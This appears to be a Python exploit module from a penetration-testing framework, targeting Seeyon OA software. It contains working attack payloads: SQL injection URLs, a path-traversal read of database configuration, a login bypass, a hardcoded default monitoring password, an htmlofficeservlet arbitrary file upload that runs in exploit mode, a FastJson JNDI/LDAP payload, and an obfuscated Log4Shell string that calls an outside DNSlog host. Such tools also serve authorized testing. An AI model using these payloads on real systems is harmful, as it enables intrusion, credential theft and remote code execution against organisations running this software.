from lib.util.exprequest import ExpRequest
from lib.util.output import Output
from lib.clasetting import Dnslog
from lib.util.fun import *
import lib.util.globalvar as GlobalVar
import prettytable as pt
import re
"""
+-------------+-------------------+-------------------------------------------------+
| Target type | Vuln Name         | Impact Version && Vulnerability description     |
+-------------+-------------------+-------------------------------------------------+
| oa_seeyon   | [InformationLeak] | 致远OA A8 状态监控页面信息泄露                    |
|             |                   | 致远OA A6 initDataAssess.jsp 用户敏感信息泄露     |
|             |                   | 致远OA A6 createMysql.jsp 数据库敏感信息泄露      |
|             |                   | 致远OA A6 DownExcelBeanServlet 用户敏感信息泄露   |
|             |                   | 致远OA getSessionList.jsp Session 泄露漏洞       |
|             |                   | 致远OA A6 config.jsp 敏感信息泄露漏洞             |
| oa_seeyon   | [SqlInjection]    | 致远OA A6 setextno.jsp SQL注入漏洞               |
|             |                   | 致远OA A6 test.jsp SQL注入漏洞                   |
| oa_seeyon   | [file upload]     | 致远OA ajax.do 登录绕过&任意文件上传              |
| oa_seeyon   | [file reading]    | 致远OA 任意文件读取                              |
| oa_seeyon   | [file upload]     | 致远OA htmlofficeservlet 任意文件上传            |
| oa_seeyon   | [SqlInjection]    | 致远OA A6 setextno.jsp SQL注入漏洞               |
| oa_seeyon   | [FastJson]        | 致远OA FastJson                                 |
| oa_seeyon   | [Log4jShell]      | 致远OA Log4jShell                               |
+-------------+-------------------+-------------------------------------------------+
"""
class oa_seeyon():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = env.get('timeout')
        self.flag = GlobalVar.get_value('flag')
            
    def vul_InformationLeak(self):
        appName = 'oa_seeyon'
        pocname = 'vul_InformationLeak'
        paths_CheckList = {
            '/yyoa/assess/js/initDataAssess.jsp':'personList',
            '/seeyon/management/status.jsp':'Password',#password=WLCCYBD@SEEYON
            '/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0':' ',
            '/yyoa/createMysql.jsp':'root',
            '/yyoa/ext/trafaxserver/SystemManage/config.jsp':'DatabaseName',
        }
        method = 'get'
        desc = '信息泄露'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                for path in paths_CheckList.keys():                
                    r = exprequest.get(url=self.url+path)
                    if r.status == 200 and paths_CheckList[path] in r.text:
                        return output.echo_success(method, desc)
                return output.fail()
            else:
                for path in paths_CheckList.keys():
                    r = exprequest.get(url=self.url+path)
                    if r.status == 200 and paths_CheckList[path] in r.text:
                        print(self.url+path)
        except Exception as error:
            return output.error_output(str(error))

    def vul_SqlInjection(self):
        appName = 'oa_seeyon'
        pocname = 'vul_SqlInjection'
        paths_CheckList = {
            '/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)':'@@basedir',
            '/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(SELECT%20@@basedir),4%23':'@@basedir',
        }
        method = 'get'
        desc = '[SqlInjection]'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                for path in paths_CheckList.keys():               
                    r = exprequest.get(url=self.url+path)
                    if paths_CheckList[path] in r.text:
                        return output.echo_success(method, desc)
                return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def vul_AjaxUpload(self):
        appName = 'oa_seeyon'
        pocname = 'vul_AjaxUpload'
        paths_CheckList = {
            '/seeyon/thirdpartyController.do.css/..;/ajax.do':'java.lang.NullPointerException:null',
            }
        method = 'get'
        desc = '[file upload]'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                for path in paths_CheckList.keys():               
                    r = exprequest.get(url=self.url+path)
                    if paths_CheckList[path] in r.text:
                        return output.echo_success(method, desc)
                return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def vul_WebMailDownloadFile(self):
        appName = 'oa_seeyon'
        pocname = 'vul_WebMailDownloadFile'
        paths_CheckList = {
            '/seeyon/webmail.do?method=doDownloadAtt&filename=conf&filePath=../conf/datasourceCtp.properties':'workflow',
            }
        method = 'get'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
            'Connection': 'close',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        desc = '[file reading]'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                for path in paths_CheckList.keys():               
                    r = exprequest.get(url=self.url+path, headers=headers)
                    if r.status == 200 and paths_CheckList[path] in r.text:
                        return output.echo_success(method, desc)
                return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def vul_Htmlofficeservlet(self):
        appName = 'oa_seeyon'
        pocname = 'vul_Htmlofficeservlet'
        paths_CheckList = {
            '/seeyon/htmlofficeservlet':'htmoffice|DBSTEP',
            }
        method = 'post'
        data = ''
        payload = 'DBSTEP V3.0     347             0               18             DBSTEP=OKMLlKlV\nOPTION=S3WYOSWLBSGr\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\nCREATEDATE=wUghPB3szB3Xwg66\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\noriginalFileId=wV66\noriginalCreateDate=wUghPB3szB3Xwg66\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdNEQ/qHOuNg66\nneedReadFile=yRWZdAS6\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\n my name is wuyanzu'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        desc = '[file upload]'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                for path in paths_CheckList.keys():               
                    r = exprequest.post(url=self.url+path,
                                        data=data,
                                        headers=headers)
                    if r.status == 200 and re.search(paths_CheckList[path], r.text):
                        return output.echo_success(method, desc)
                return output.fail()
            else:
                r = exprequest.post(url=self.url+'/seeyon/htmlofficeservlet',
                                    data=payload,
                                    headers=headers)
                r = exprequest.get(url=self.url+'/seeyon/wyz.txt')
                if 'wuyanzu' in r.text:
                    print('[+]上传成功, 上传文件地址为: %s'%(self.url+path))
                else:
                    print('[-] %s 上传失败'%self.url)
        except Exception as error:
            return output.error_output(str(error))

    def vul_SetextnoSqlInjection(self):
        appName = 'oa_seeyon'
        pocname = 'vul_SetextnoSqlInjection'
        paths_CheckList = {
            '/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp':'mysql',
            }
        method = 'post'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        desc = '[SqlInjection]'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                for path in paths_CheckList.keys():               
                    r = exprequest.post(url=self.url+path,
                                        data=data,
                                        headers=headers)
                    if r.status == 200 and re.search(paths_CheckList[path], r.text):
                        return output.echo_success(method, desc)
                return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def vul_FastJson(self):
        appName = 'oa_seeyon'
        pocname = 'vul_FastJson'
        path = '/seeyon/main.do?method=transLogout'
        data_CheckList = {
            '1.2.47':'{"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://DNS","autoCommit":true}}'
        }
        method = 'post'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/json'}
        desc = '[SqlInjection]'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                DL = Dnslog()
                for data in data_CheckList.keys():               
                    r = exprequest.post(url=self.url+path,
                                        data=data_CheckList[data].replace('DNS', DL.dns_host()),
                                        headers=headers)
                    if DL.result():
                        return output.echo_success(method, desc)
                return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def vul_Log4jShell(self):
        appName = 'oa_seeyon'
        pocname = 'vul_Log4jShell'
        path = '/seeyon/main.do?method=login'
        data = 'authorization=&login.timezone=GMT+8:00&province=&city=&rectangle=&login_username='
        payload = '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://'
        method = 'post'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        desc = '[Log4jShell]'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                DL = Dnslog()            
                r = exprequest.post(url=self.url+path,
                                    data=data + payload + DL.dns_host() + "}",
                                    headers=headers)
                if DL.result():
                    return output.echo_success(method, desc)
                return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    Expoa_seeyon = oa_seeyon(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(Expoa_seeyon, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(oa_seeyon):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(Expoa_seeyon, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)